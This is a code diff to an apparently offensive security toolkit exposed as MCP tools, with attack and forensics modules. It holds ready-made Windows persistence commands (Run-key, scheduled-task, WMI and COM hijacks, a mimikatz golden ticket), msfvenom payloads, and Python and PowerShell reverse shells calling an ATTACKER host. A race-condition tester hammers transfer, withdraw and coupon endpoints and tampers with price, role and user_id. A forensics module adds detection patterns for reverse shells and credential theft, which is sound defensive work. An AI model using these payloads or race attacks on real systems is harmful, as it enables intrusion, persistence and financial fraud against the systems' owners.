+                 "command": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\\Users\\Public\\update.exe" /f',
+                 "detection": "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                 "stealth": "medium"},
+                {"name": "scheduled_task",
+                 "command": 'schtasks /create /tn "WindowsDefenderUpdate" /tr "C:\\Users\\Public\\update.exe" /sc onlogon /rl highest /f',
+                 "detection": "schtasks /query /fo LIST /v",
+                 "stealth": "medium"},
+                {"name": "wmi_event_subscription",
+                 "command": 'wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilterToConsumerBinding CREATE Filter="__EventFilter.Name=\\"TimerTrigger\\"",Consumer="CommandLineEventConsumer.Name=\\"BackdoorConsumer\\""',
+                 "detection": "Get-WMIObject -Namespace root\\Subscription -Class __EventFilter",
+                 "stealth": "high"},
+                {"name": "dll_hijack",
+                 "command": "# Place malicious DLL in app directory that loads before system32\n# Identify: procmon.exe filter on NAME NOT FOUND + path contains .dll\n# Common targets: version.dll, winmm.dll, dbghelp.dll",
+                 "detection": "Autoruns.exe; sigcheck.exe on DLLs in PATH",
+                 "stealth": "very_high"},
+                {"name": "golden_ticket",
+                 "command": "mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-xxx /krbtgt:HASH /id:500",
+                 "detection": "Monitor Event ID 4769 with encryption type 0x17",
+                 "stealth": "very_high"},
+                {"name": "startup_folder",
+                 "command": 'copy payload.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.exe"',
+                 "detection": 'dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"',
+                 "stealth": "low"},
+                {"name": "com_hijack",
+                 "command": 'reg add "HKCU\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32" /ve /t REG_SZ /d "C:\\evil.dll" /f',
+                 "detection": "Autoruns.exe COM tab",
+                 "stealth": "very_high"},
+            ]
+            per["payload_generation"] = {
+                "msfvenom_linux": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o /tmp/update",
+                "msfvenom_windows": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o update.exe",
+                "msfvenom_dll": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o evil.dll",
+                "python_reverse": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"ATTACKER\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
+                "powershell_reverse": "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
             }
+            kill_chain.advance_phase(target, KillChainPhase.INSTALLATION, "post_exploit_ops", [f"persistence_techniques:{len(per['linux']['techniques']) + len(per['windows']['techniques'])}"])
             results["modules"]["persist"] = per
         if "lateral" in mod_list:
             lat = {
@@ -4386,10 +4977,716 @@ async def payload_factory(
 
 
 # ============================================================================
+# MODULE 21: FORENSICS ENGINE
+# Log analysis, malware/botnet detection, USB forensics, memory analysis,
+# ransomware/crypto analysis, YARA scanning, IOC extraction, timeline building
+# ============================================================================
+
+@mcp.tool()
+async def forensics_engine(
+    target: str = "localhost",
+    depth: str = "deep",
+    modules: str = "all",
+    log_path: Optional[str] = None,
+    yara_rules: Optional[str] = None,
+    memory_dump: Optional[str] = None,
+    disk_image: Optional[str] = None,
+    timeout: int = 600,
+) -> str:
+    """Digital forensics & incident response engine.
+    modules: all|log_analysis,malware_detect,usb_forensics,memory_analysis,
+             ransomware_analysis,yara_scan,ioc_extract,timeline,network_forensics,botnet_detect
+    log_path: path to log files for analysis
+    yara_rules: path to custom YARA rules directory
+    memory_dump: path to memory dump for volatility analysis
+    disk_image: path to disk image for analysis"""
+    execution = session_manager.start_execution("forensics_engine", target, {"depth": depth, "modules": modules})
+    results = {"target": target, "depth": depth, "modules": {}}
+
+    try:
+        mod_list = modules.split(",") if modules != "all" else [
+            "log_analysis", "malware_detect", "usb_forensics", "memory_analysis",
+            "ransomware_analysis", "yara_scan", "ioc_extract", "timeline",
+            "network_forensics", "botnet_detect"
+        ]
+        delay = rate_limit_detector.get_delay(target)
+
+        # --- LOG ANALYSIS (syslog, auth.log, Windows EventLog, Apache, nginx) ---
+        if "log_analysis" in mod_list:
+            la = {"findings": [], "suspicious_events": [], "auth_failures": [],
+                  "privilege_escalations": [], "timeline_events": []}
+            log_files = []
+            if log_path and os.path.exists(log_path):
+                log_files = [log_path]
+            else:
+                # Auto-discover log files
+                candidates = [
+                    "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
+                    "/var/log/secure", "/var/log/apache2/access.log",
+                    "/var/log/apache2/error.log", "/var/log/nginx/access.log",
+                    "/var/log/nginx/error.log", "/var/log/fail2ban.log",
+                    "/var/log/kern.log", "/var/log/daemon.log",
+                    "/var/log/dpkg.log", "/var/log/lastlog",
+                ]
+                log_files = [f for f in candidates if os.path.exists(f)]
+            la["log_files_found"] = log_files
+
+            for lf in log_files[:5]:
+                try:
+                    # Read last 1000 lines
+                    tail_r = await run_command(["tail", "-n", "1000", lf], timeout=10)
+                    if not tail_r.get("stdout"):
+                        continue
+                    content = tail_r["stdout"]
+                    # Auth failure patterns
+                    auth_fails = re.findall(
+                        r"(\w+\s+\d+\s+[\d:]+).*(?:Failed password|authentication failure|"
+                        r"Invalid user|FAILED LOGIN|Access denied).*?(?:from\s+|rhost=)([\d.]+)",
+                        content, re.IGNORECASE)
+                    for ts, ip in auth_fails:
+                        la["auth_failures"].append({"timestamp": ts, "source_ip": ip, "log": lf})
+
+                    # Privilege escalation patterns
+                    privesc = re.findall(
+                        r"(\w+\s+\d+\s+[\d:]+).*(?:sudo|su\[|pkexec|polkit|"
+                        r"COMMAND=|session opened for user root)",
+                        content, re.IGNORECASE)
+                    for match in privesc[:20]:
+                        la["privilege_escalations"].append({"event": match[:200], "log": lf})
+
+                    # Suspicious patterns: reverse shells, encoded commands, data exfil
+                    suspicious_patterns = [
+                        (r"(?:bash\s+-i|nc\s+-[elp]|ncat\s+|python.*socket|perl.*socket|"
+                         r"ruby.*socket|php.*fsockopen|/dev/tcp/)", "reverse_shell"),
+                        (r"(?:base64\s+-d|python.*base64|eval\(|exec\(|system\()", "encoded_command"),
+                        (r"(?:wget\s+http|curl\s+http).*(?:\|\s*sh|\|\s*bash|>\s*/tmp)", "download_exec"),
+                        (r"(?:/etc/shadow|/etc/passwd.*root|/proc/self)", "credential_access"),
+                        (r"(?:iptables\s+-F|ufw\s+disable|setenforce\s+0)", "defense_evasion"),
+                        (r"(?:crontab|at\s+|systemctl\s+enable|\.bashrc)", "persistence"),
+                    ]
+                    for pattern, category in suspicious_patterns:
+                        matches = re.findall(pattern, content, re.IGNORECASE)
+                        for m in matches[:5]:
+                            la["suspicious_events"].append({
+                                "category": category, "evidence": m[:200], "log": lf,
+                            })
+
+                    # Brute force detection (>5 fails from same IP)
+                    ip_counts = {}
+                    for _, ip in auth_fails:
+                        ip_counts[ip] = ip_counts.get(ip, 0) + 1
+                    for ip, count in ip_counts.items():
+                        if count >= 5:
+                            la["findings"].append({
+                                "type": "brute_force_detected",
+                                "source_ip": ip, "attempts": count,
+                                "severity": "high",
+                            })
+                            score, vec, sev = CVSSCalculator.score_for_vuln_type("default_credentials")
+                            vuln_correlator.add_vulnerability(VulnFinding(
+                                vuln_id=f"bruteforce_{ip}", title=f"Brute force from {ip} ({count} attempts)",
+                                severity="high", cvss_score=7.5, cvss_vector=vec, target=target,
+                                mitre_techniques=["T1110"], evidence=f"{count} auth failures from {ip}",
+                            ))
+                except Exception:
+                    pass
+
+            # Windows EventLog analysis (if evtx available)
+            evtx_result = await run_command(
+                ["find", "/var/log", "-name", "*.evtx", "-type", "f"], timeout=10)
+            if evtx_result.get("stdout"):
+                la["windows_evtx_found"] = evtx_result["stdout"].strip().split("\n")
+
+            results["modules"]["log_analysis"] = la
+
+        # --- MALWARE / BOTNET DETECTION ---
+        if "malware_detect" in mod_list or "botnet_detect" in mod_list:
+            md = {"suspicious_processes": [], "suspicious_connections": [],
+                  "rootkit_indicators": [], "botnet_indicators": [], "iocs": []}
+
+            # Suspicious processes
+            ps_r = await run_command(["ps", "auxww"], timeout=10)
+            if ps_r.get("stdout"):
+                suspicious_proc_patterns = [
+                    r"(.*(?:nc\s+-[elp]|ncat|socat|/dev/tcp|cryptominer|xmrig|"
+                    r"minerd|coinhive|kworker.*\[|\.hidden|/tmp/\.\w+|"
+                    r"perl\s+-e|python\s+-c.*socket|ruby\s+-rsocket).*)",
+                ]
+                for pattern in suspicious_proc_patterns:
+                    for match in re.findall(pattern, ps_r["stdout"], re.IGNORECASE):
+                        md["suspicious_processes"].append(match.strip()[:300])
+
+            # Suspicious network connections (C2 beacons, crypto miners)
+            ss_r = await run_command(["ss", "-tupn"], timeout=10)
+            if ss_r.get("stdout"):
+                c2_ports = {"4444", "5555", "6666", "8888", "1234", "9999", "31337", "12345"}
+                mining_ports = {"3333", "3334", "14433", "14444", "45560", "45700"}
+                tor_ports = {"9050", "9150"}
+                for line in ss_r["stdout"].split("\n"):
+                    if "ESTAB" in line:
+                        # Check for known bad ports
+                        for port_set, category in [(c2_ports, "c2_port"), (mining_ports, "mining_port"), (tor_ports, "tor_proxy")]:
+                            for port in port_set:
+                                if f":{port}" in line:
+                                    md["botnet_indicators"].append({
+                                        "type": category, "connection": line.strip()[:200],
+                                    })
+
+            # Rootkit detection
+            rk_checks = [
+                ("chkrootkit", ["-q"]),
+                ("rkhunter", ["--check", "--skip-keypress", "--report-warnings-only"]),
+            ]
+            for tool, args in rk_checks:
+                rk_r = await run_command([tool] + args, timeout=120)
+                if rk_r.get("stdout") and ("INFECTED" in rk_r["stdout"] or "Warning" in rk_r["stdout"]):
+                    md["rootkit_indicators"].append({
+                        "tool": tool,
+                        "output": rk_r["stdout"][:2000],
+                    })
+
+            # Hidden files in /tmp and unusual SUID binaries
+            hidden_r = await run_command(
+                ["find", "/tmp", "/var/tmp", "/dev/shm", "-name", ".*", "-type", "f", "-newer", "/etc/passwd"],
+                timeout=15)
+            if hidden_r.get("stdout"):
+                md["iocs"].extend([{"type": "hidden_file", "path": f.strip()}
+                                    for f in hidden_r["stdout"].strip().split("\n") if f.strip()][:20])
+
+            # SUID binaries check
+            suid_r = await run_command(
+                ["find", "/", "-perm", "-4000", "-type", "f", "-not", "-path", "*/proc/*"],
+                timeout=30)
+            if suid_r.get("stdout"):
+                known_suid = {"/usr/bin/sudo", "/usr/bin/passwd", "/usr/bin/su", "/usr/bin/mount",
+                              "/usr/bin/umount", "/usr/bin/ping", "/usr/bin/chsh", "/usr/bin/chfn",
+                              "/usr/bin/newgrp", "/usr/bin/gpasswd", "/usr/sbin/pppd"}
+                for f in suid_r["stdout"].strip().split("\n"):
+                    if f.strip() and f.strip() not in known_suid:
+                        md["iocs"].append({"type": "unusual_suid", "path": f.strip()})
+
+            # DNS analysis for C2 beacons (unusual DNS queries)
+            dns_r = await run_command(
+                ["cat", "/var/log/syslog"], timeout=10)
+            if dns_r.get("stdout"):
+                # Long subdomains = potential DNS tunneling
+                dns_tunnel = re.findall(r"query\[A\]\s+(\S{50,})", dns_r["stdout"])
+                for dt in dns_tunnel[:10]:
+                    md["botnet_indicators"].append({"type": "dns_tunneling_suspect", "domain": dt[:100]})
+
+            if md["suspicious_processes"] or md["botnet_indicators"] or md["rootkit_indicators"]:
+                vuln_correlator.add_vulnerability(VulnFinding(
+                    vuln_id="malware_detected", title="Malware/Botnet indicators found",
+                    severity="critical", cvss_score=9.8, cvss_vector="",
+                    target=target, exploitable=False,
+                    kill_chain_phase="actions_on_objectives",
+                    mitre_techniques=["T1059", "T1071", "T1105"],
+                    evidence=f"Suspicious: {len(md['suspicious_processes'])} procs, "
+                             f"{len(md['botnet_indicators'])} botnet indicators",
+                ))
+
+            results["modules"]["malware_detect"] = md
+
+        # --- USB FORENSICS ---
+        if "usb_forensics" in mod_list:
+            uf = {"connected_devices": [], "history": [], "suspicious_devices": [], "hid_attacks": []}
+
+            # Current USB devices
+            lsusb_r = await run_command(["lsusb", "-v"], timeout=15)
+            if lsusb_r.get("stdout"):
+                # Parse devices
+                for line in lsusb_r["stdout"].split("\n"):
+                    if line.startswith("Bus"):
+                        uf["connected_devices"].append(line.strip()[:200])
+                # Detect suspicious HID devices (BadUSB, Rubber Ducky, USB Armory)
+                hid_patterns = [
+                    r"(?:Rubber\s*Ducky|USB\s*Armory|Teensy|DigiSpark|"
+                    r"Hak5|Bash\s*Bunny|LAN\s*Turtle|Packet\s*Squirrel)",
+                    r"(?:0x2341|0x1781|0x16c0|0x1d50)",  # Known attack tool vendor IDs
+                ]
+                for pattern in hid_patterns:
+                    matches = re.findall(pattern, lsusb_r["stdout"], re.IGNORECASE)
+                    for m in matches:
+                        uf["suspicious_devices"].append({"type": "potential_hid_attack", "match": m})
+
+            # USB connection history from dmesg/syslog
+            dmesg_r = await run_command(["dmesg", "--time-format", "iso"], timeout=10)
+            if dmesg_r.get("stdout"):
+                usb_events = re.findall(
+                    r"(\d{4}-\d{2}-\d{2}T[\d:]+\+\d+).*(?:usb\s+\d[\d.-]+|USB).*?:\s*(.*?)$",
+                    dmesg_r["stdout"], re.MULTILINE)
+                for ts, event in usb_events[:30]:
+                    uf["history"].append({"timestamp": ts, "event": event[:200]})
+                # HID attack patterns in dmesg
+                hid_events = re.findall(
+                    r".*(?:new.*keyboard|input:.*as\s+/devices.*event\d+|"
+                    r"hidraw\d+.*HID).*",
+                    dmesg_r["stdout"], re.IGNORECASE)
+                for he in hid_events[:10]:
+                    uf["hid_attacks"].append({"type": "hid_device_detected", "event": he.strip()[:200]})
+
+            # Check for USB mass storage automount (attack vector)
+            mount_r = await run_command(["mount"], timeout=5)
+            if mount_r.get("stdout"):
+                usb_mounts = re.findall(r"(/dev/sd[b-z]\d*\s+on\s+\S+.*)", mount_r["stdout"])
+                for um in usb_mounts:
+                    uf["suspicious_devices"].append({"type": "usb_mass_storage_mounted", "mount": um[:200]})
+
+            results["modules"]["usb_forensics"] = uf
+
+        # --- MEMORY ANALYSIS (Volatility) ---
+        if "memory_analysis" in mod_list and memory_dump:
+            ma = {"profile": "unknown", "processes": [], "network": [], "injections": [], "malfind": []}
+            # Check for volatility
+            vol_check = await run_command(["which", "vol"], timeout=5)
+            vol_cmd = "vol" if vol_check.get("success") else "volatility"
+
+            if os.path.exists(memory_dump):
+                # Image info
+                info_r = await run_command(
+                    [vol_cmd, "-f", memory_dump, "imageinfo"], timeout=120)
+                if info_r.get("stdout"):
+                    profile_match = re.search(r"Suggested Profile\(s\)\s*:\s*(\S+)", info_r["stdout"])
+                    if profile_match:
+                        ma["profile"] = profile_match.group(1)
+
+                profile = ma["profile"].split(",")[0] if ma["profile"] != "unknown" else "Win7SP1x64"
+
+                # Process list
+                ps_r = await run_command(
+                    [vol_cmd, "-f", memory_dump, "--profile", profile, "pslist"], timeout=120)
+                if ps_r.get("stdout"):
+                    ma["processes"] = ps_r["stdout"][:3000]
+
+                # Network connections
+                net_r = await run_command(
+                    [vol_cmd, "-f", memory_dump, "--profile", profile, "netscan"], timeout=120)
+                if net_r.get("stdout"):
+                    ma["network"] = net_r["stdout"][:3000]
+
+                # Malfind (injected code detection)
+                mf_r = await run_command(
+                    [vol_cmd, "-f", memory_dump, "--profile", profile, "malfind"], timeout=180)
+                if mf_r.get("stdout"):
+                    ma["malfind"] = mf_r["stdout"][:3000]
+                    if "MZ" in mf_r["stdout"] or "This program" in mf_r["stdout"]:
+                        ma["injections"].append("PE injection detected in process memory")
+
+            results["modules"]["memory_analysis"] = ma
+
+        # --- RANSOMWARE ANALYSIS ---
+        if "ransomware_analysis" in mod_list:
+            ra = {"encrypted_files": [], "ransom_notes": [], "crypto_indicators": [],
+                  "file_entropy": [], "known_extensions": [], "decryption_possible": False}
+
+            # Known ransomware file extensions
+            ransom_extensions = [
+                ".encrypted", ".locked", ".crypto", ".crypt", ".enc", ".locky", ".cerber",
+                ".zepto", ".odin", ".thor", ".aesir", ".zzzzz", ".micro", ".mp3",
+                ".xxx", ".ttt", ".petya", ".wannacry", ".wncry", ".wcry", ".crab",
+                ".gandcrab", ".KRAB", ".dharma", ".arena", ".java", ".bip",
+                ".combo", ".adobe", ".STOP", ".djvu", ".puma", ".shade",
+                ".RYUK", ".RYK", ".hermes", ".phobos", ".eking", ".makop",
+            ]
+            # Search for encrypted files
+            for ext in ransom_extensions[:15]:
+                find_r = await run_command(
+                    ["find", "/", "-maxdepth", "4", "-name", f"*{ext}", "-type", "f"],
+                    timeout=15)
+                if find_r.get("stdout") and find_r["stdout"].strip():
+                    for f in find_r["stdout"].strip().split("\n")[:5]:
+                        ra["encrypted_files"].append({"extension": ext, "path": f.strip()})
+
+            # Search for ransom notes
+            note_patterns = ["README*.txt", "DECRYPT*.txt", "HOW_TO_RECOVER*", "HELP_DECRYPT*",
+                             "YOUR_FILES*", "_readme.txt", "!README!*", "RECOVERY*"]
+            for np in note_patterns:
+                note_r = await run_command(
+                    ["find", "/", "-maxdepth", "4", "-name", np, "-type", "f"], timeout=10)
+                if note_r.get("stdout") and note_r["stdout"].strip():
+                    for f in note_r["stdout"].strip().split("\n")[:3]:
+                        # Read the note content
+                        cat_r = await run_command(["head", "-20", f.strip()], timeout=5)
+                        ra["ransom_notes"].append({
+                            "path": f.strip(),
+                            "content": cat_r.get("stdout", "")[:1000],
+                        })
+
+            # File entropy analysis (high entropy = encrypted)
+            if ra["encrypted_files"]:
+                for ef in ra["encrypted_files"][:5]:
+                    ent_r = await run_command(
+                        ["python3", "-c",
+                         f"import math,collections;d=open('{ef['path']}','rb').read(4096);"
+                         f"e=collections.Counter(d);l=len(d);"
+                         f"print(-sum((c/l)*math.log2(c/l) for c in e.values() if c))"],
+                        timeout=5)
+                    if ent_r.get("stdout"):
+                        try:
+                            entropy = float(ent_r["stdout"].strip())
+                            ra["file_entropy"].append({
+                                "file": ef["path"], "entropy": round(entropy, 2),
+                                "encrypted": entropy > 7.5,
+                            })
+                        except ValueError:
+                            pass
+
+            # Check for known ransomware decryptors
+            if ra["encrypted_files"]:
+                ra["decryption_advice"] = {
+                    "nomoreransom": "https://www.nomoreransom.org/en/decryption-tools.html",
+                    "id_ransomware": "https://id-ransomware.malwarehunterteam.com/",
+                    "action": "Upload ransom note or encrypted sample to identify variant",
+                }
+                ra["decryption_possible"] = any(
+                    ext in [".STOP", ".djvu", ".shade", ".gandcrab"]
+                    for ef in ra["encrypted_files"]
+                    for ext in [ef["extension"]]
+                )
+
+            results["modules"]["ransomware_analysis"] = ra
+
+        # --- YARA SCANNING ---
+        if "yara_scan" in mod_list:
+            ys = {"matches": [], "rules_used": 0}
+            yara_check = await run_command(["which", "yara"], timeout=5)
+            if yara_check.get("success"):
+                # Find YARA rules
+                rules_dirs = [yara_rules] if yara_rules else [
+                    "/usr/share/yara", "/opt/yara-rules", "/etc/yara",
+                    os.path.join(BASE_DIR, "yara_rules"),
+                ]
+                rule_files = []
+                for rd in rules_dirs:
+                    if rd and os.path.isdir(rd):
+                        for f in os.listdir(rd):
+                            if f.endswith((".yar", ".yara")):
+                                rule_files.append(os.path.join(rd, f))
+
+                ys["rules_used"] = len(rule_files)
+                scan_targets = ["/tmp", "/var/tmp", "/dev/shm"]
+                for rf in rule_files[:10]:
+                    for st in scan_targets:
+                        yr = await run_command(
+                            ["yara", "-r", rf, st], timeout=60)
+                        if yr.get("stdout"):
+                            for line in yr["stdout"].strip().split("\n"):
+                                if line.strip():
+                                    ys["matches"].append(line.strip()[:300])
+            results["modules"]["yara_scan"] = ys
+
+        # --- IOC EXTRACTION ---
+        if "ioc_extract" in mod_list:
+            iocs = {"ips": [], "domains": [], "hashes": [], "urls": [], "emails": []}
+            # Collect from all memory findings
+            all_text = json.dumps(results)
+            # IP extraction
+            iocs["ips"] = list(set(re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", all_text)))[:50]
+            # Domain extraction
+            iocs["domains"] = list(set(re.findall(
+                r"\b(?:[a-zA-Z0-9-]+\.)+(?:com|net|org|io|ru|cn|xyz|top|info|tk|pw|cc)\b",
+                all_text)))[:50]
+            # Hash extraction
+            iocs["hashes"] = list(set(re.findall(r"\b[a-f0-9]{32,64}\b", all_text)))[:30]
+            # URL extraction
+            iocs["urls"] = list(set(re.findall(r"https?://[^\s<>\"']+", all_text)))[:30]
+            results["modules"]["ioc_extract"] = iocs
+
+        # --- NETWORK FORENSICS ---
+        if "network_forensics" in mod_list:
+            nf = {"active_connections": [], "dns_cache": [], "arp_table": [],
+                  "routing": [], "firewall_rules": [], "listening_services": []}
+
+            # Active connections with process info
+            ss_full = await run_command(["ss", "-tupan"], timeout=10)
+            if ss_full.get("stdout"):
+                nf["active_connections"] = ss_full["stdout"][:3000]
+
+            # ARP table (detect ARP spoofing)
+            arp_r = await run_command(["arp", "-a"], timeout=5)
+            if arp_r.get("stdout"):
+                nf["arp_table"] = arp_r["stdout"][:1000]
+                # Detect duplicate MACs (ARP spoofing indicator)
+                macs = re.findall(r"([\da-f:]{17})", arp_r["stdout"], re.IGNORECASE)
+                mac_counts = {}
+                for mac in macs:
+                    mac_counts[mac] = mac_counts.get(mac, 0) + 1
+                for mac, count in mac_counts.items():
+                    if count > 1:
+                        nf["arp_spoofing_detected"] = {"mac": mac, "count": count}
+
+            # Routing table
+            route_r = await run_command(["ip", "route"], timeout=5)
+            if route_r.get("stdout"):
+                nf["routing"] = route_r["stdout"][:1000]
+
+            # Firewall rules
+            ipt_r = await run_command(["iptables", "-L", "-n", "--line-numbers"], timeout=10)
+            if ipt_r.get("stdout"):
+                nf["firewall_rules"] = ipt_r["stdout"][:2000]
+
+            results["modules"]["network_forensics"] = nf
+
+        # --- TIMELINE BUILDING ---
+        if "timeline" in mod_list:
+            tl = {"events": []}
+            # Combine all timestamped events from other modules
+            log_events = results.get("modules", {}).get("log_analysis", {}).get("auth_failures", [])
+            for le in log_events[:20]:
+                tl["events"].append({"time": le.get("timestamp", ""), "type": "auth_failure",
+                                      "source": le.get("source_ip", ""), "detail": "Authentication failure"})
+
+            usb_events = results.get("modules", {}).get("usb_forensics", {}).get("history", [])
+            for ue in usb_events[:20]:
+                tl["events"].append({"time": ue.get("timestamp", ""), "type": "usb_event",
+                                      "detail": ue.get("event", "")[:100]})
+
+            # Sort by timestamp
+            tl["events"].sort(key=lambda x: x.get("time", ""))
+            tl["total_events"] = len(tl["events"])
+            results["modules"]["timeline"] = tl
+
+        kill_chain.advance_phase(target, KillChainPhase.ACTIONS_ON_OBJECTIVES,
+                                  "forensics_engine", [f"modules:{len(results['modules'])}"])
+        results["correlation"] = vuln_correlator.correlate(target)
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 22: RACE CONDITION TESTER
+# Turbo Intruder-style concurrent requests, TOCTOU, parallel parameter
+# manipulation, timing attacks, session race, file upload race
+# ============================================================================
+
+@mcp.tool()
+async def race_condition_tester(
+    target: str,
+    depth: str = "deep",
+    modules: str = "all",
+    endpoint: Optional[str] = None,
+    param: Optional[str] = None,
+    method: str = "POST",
+    data: Optional[str] = None,
+    threads: int = 20,
+    timeout: int = 300,
+) -> str:
+    """Race condition & timing attack engine.
+    modules: all|concurrent_requests,toctou,session_race,limit_bypass,file_race,timing_attack
+    endpoint: specific URL endpoint to test
+    threads: number of concurrent threads (turbo intruder style)"""
+    target = InputValidator.sanitize_target(target)
+    execution = session_manager.start_execution("race_condition_tester", target,
+                                                 {"depth": depth, "modules": modules})
+    results = {"target": target, "depth": depth, "modules": {}}
+
+    try:
+        mod_list = modules.split(",") if modules != "all" else [
+            "concurrent_requests", "toctou", "session_race",
+            "limit_bypass", "file_race", "timing_attack"
+        ]
+        base_url = target if target.startswith("http") else f"http://{target}"
+
+        # --- CONCURRENT REQUEST RACE (Turbo Intruder style) ---
+        if "concurrent_requests" in mod_list:
+            cr = {"vulnerable": False, "tests": [], "anomalies": []}
+            test_endpoints = [endpoint] if endpoint else [
+                "/api/transfer", "/api/withdraw", "/api/redeem",
+                "/api/coupon", "/api/vote", "/api/like",
+                "/checkout", "/order", "/register", "/api/v1/users",
+            ]
+
+            for ep in test_endpoints[:5]:
+                url = f"{base_url}{ep}"
+                # Send N identical requests simultaneously
+                async def send_one(session_id: int):
+                    curl_args = ["curl", "-sk", "-o", "/dev/null", "-w",
+                                 "%{http_code}|%{time_total}|%{size_download}",
+                                 "-X", method, url]
+                    if data:
+                        curl_args.extend(["-d", data, "-H", "Content-Type: application/json"])
+                    r = await run_command(curl_args, timeout=15)
+                    return r.get("stdout", "")
+
+                # Fire N requests concurrently
+                tasks = [send_one(i) for i in range(min(threads, 50))]
+                responses = await asyncio.gather(*tasks, return_exceptions=True)
+
+                # Analyze for anomalies
+                status_codes = []
+                times = []
+                sizes = []
+                for resp in responses:
+                    if isinstance(resp, str) and "|" in resp:
+                        parts = resp.split("|")
+                        if len(parts) >= 3:
+                            status_codes.append(parts[0])
+                            try:
+                                times.append(float(parts[1]))
+                            except ValueError:
+                                pass
+                            sizes.append(parts[2])
+
+                test_result = {
+                    "endpoint": ep,
+                    "threads": len(tasks),
+                    "responses": len(status_codes),
+                    "status_codes": dict((s, status_codes.count(s)) for s in set(status_codes)),
+                    "response_sizes": dict((s, sizes.count(s)) for s in set(sizes)),
+                }
+
+                # Race detected if: multiple 200s where only 1 should succeed, or varying response sizes
+                if len(set(sizes)) > 1 and len(set(status_codes)) > 1:
+                    test_result["race_indicator"] = True
+                    cr["anomalies"].append({
+                        "endpoint": ep, "type": "varying_responses",
+                        "detail": f"Multiple response patterns: sizes={len(set(sizes))}, codes={len(set(status_codes))}",
+                    })
+                if status_codes.count("200") > 1 and any(s != "200" for s in status_codes):
+                    test_result["race_indicator"] = True
+                    cr["anomalies"].append({
+                        "endpoint": ep, "type": "multiple_success",
+                        "detail": f"{status_codes.count('200')} successes out of {len(status_codes)} requests",
+                    })
+
+                cr["tests"].append(test_result)
+
+            if cr["anomalies"]:
+                cr["vulnerable"] = True
+                score, vec, sev = CVSSCalculator.score_for_vuln_type("idor")
+                vuln_correlator.add_vulnerability(VulnFinding(
+                    vuln_id=f"race_condition_{endpoint or 'multi'}",
+                    title=f"Race condition detected on {len(cr['anomalies'])} endpoint(s)",
+                    severity="high", cvss_score=7.5, cvss_vector=vec, target=target,
+                    service="http", exploitable=True,
+                    kill_chain_phase="exploitation",
+                    mitre_techniques=["T1499.004"],
+                    remediation="Implement mutex/locking, idempotency tokens, database-level constraints",
+                ))
+
+            results["modules"]["concurrent_requests"] = cr
+
+        # --- TOCTOU (Time-of-Check-Time-of-Use) ---
+        if "toctou" in mod_list:
+            tc = {"tests": [], "vulnerable": False}
+            # Test: rapidly change a parameter between check and use
+            toctou_scenarios = [
+                {"name": "price_manipulation", "check_param": "price", "values": ["1", "0", "-1", "99999"]},
+                {"name": "role_escalation", "check_param": "role", "values": ["user", "admin", "root"]},
+                {"name": "quantity_abuse", "check_param": "quantity", "values": ["1", "100", "999999"]},
+                {"name": "account_switch", "check_param": "user_id", "values": ["1", "2", "0", "999"]},
+            ]
+            for scenario in toctou_scenarios:
+                for val in scenario["values"]:
+                    url = f"{base_url}{endpoint or '/api/action'}?{scenario['check_param']}={val}"
+                    r = await run_command(
+                        ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", url], timeout=10)
+                    code = r.get("stdout", "000")
+                    if code in ["200", "201", "302"]:
+                        tc["tests"].append({
+                            "scenario": scenario["name"],
+                            "param": scenario["check_param"],
+                            "value": val, "response": code,
+                        })
+            results["modules"]["toctou"] = tc
+
+        # --- SESSION RACE ---
+        if "session_race" in mod_list:
+            sr = {"tests": [], "session_fixation_possible": False}
+            # Test concurrent session operations
+            url = f"{base_url}{endpoint or '/api/session'}"
+            # Rapid login attempts to detect session confusion
+            login_tasks = []
+            for i in range(5):
+                login_tasks.append(run_command(
+                    ["curl", "-sk", "-c", f"/tmp/race_cookies_{i}", "-w", "%{http_code}",
+                     "-d", f"user=test{i}&pass=test", url], timeout=10))
+            login_results = await asyncio.gather(*login_tasks, return_exceptions=True)
+            sr["concurrent_logins"] = len([r for r in login_results
+                                            if not isinstance(r, Exception) and r.get("success")])
+            results["modules"]["session_race"] = sr
+
+        # --- LIMIT BYPASS (coupon reuse, vote stuffing, withdrawal race) ---
+        if "limit_bypass" in mod_list:
+            lb = {"tests": [], "bypasses_found": []}
+            limit_endpoints = [endpoint] if endpoint else [
+                "/api/coupon/apply", "/api/vote", "/api/like",
+                "/api/redeem", "/api/claim", "/api/transfer",
+            ]
+            for ep in limit_endpoints[:3]:
+                url = f"{base_url}{ep}"
+                # Send rapid identical requests
+                tasks = [run_command(
+                    ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}",
+                     "-X", "POST", "-d", data or '{"action":"apply"}',
+                     "-H", "Content-Type: application/json", url], timeout=10)
